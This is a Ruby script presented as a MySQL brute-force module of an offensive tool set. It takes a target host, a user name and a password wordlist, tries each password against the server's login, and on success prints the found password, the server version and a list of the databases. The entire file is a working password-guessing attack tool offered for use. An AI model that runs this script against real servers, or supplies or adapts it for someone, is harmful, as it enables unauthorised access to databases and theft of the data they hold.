#!/usr/bin/env ruby
#
# Module name: MySQL bruteforcer
#
# Author: Aris Kurniawan
#
# This script merged with ShareSploit-Framework/modules
#
# This module require 'libmysqlclient-dev' and 'mysql gem'
#

require 'mysql'
require 'time'
require './core/notif'

def banner
	$app = __FILE__
	puts "MySQL bruteforcer v1"
	puts ""
	puts "Usage: ruby #{$app} [user] [host] [path/to/wordlist.txt]"
	#
	# Options:
	#          -u, --user=name     User for login if not current user.
	#          -h, --host=name     Connect to host.
	#          -w, --wordlist      Path to password dictionary.
end

$time = Time.new 
$user, $host, $lib = ARGV[0], ARGV[1], ARGV[2]

if ARGV.length == 3
	$wordlist = File.read($lib)
	query = []

	$wordlist.each_line do |passwd|
		query << passwd
	end

	puts Notif.proc+" MySQL bruteforce starting at #{$time}"
	puts Notif.proc+" Bruteforcing on MySQL user { #{$user}"+"@"+"#{$host} }"
	sleep 2

	for brute in query
		begin
			$attack = brute.chomp!
			$con = Mysql.real_connect($host, $user, $attack, "information_schema") # <-- default DB request
			puts Notif.ok+" Login successful using password: "+$attack
 			puts Notif.ok+" MySQL database version detected: "+$con.get_server_info
			puts

			# mapping DBS
			puts " @databases = {"
			$con.list_dbs.each do |remote_database|
				puts "               '"+remote_database+"'"
			end
			puts "              };"

			puts
			puts Notif.proc+" MySQL bruteforce finished at #{$time}"
			exit 1
		rescue Mysql::Error
			puts Notif.fail+" Login failed using password: "+$attack
		rescue Interrupt => handle
		ensure
			$con.close if $con
 		end
	end

else
	banner
end
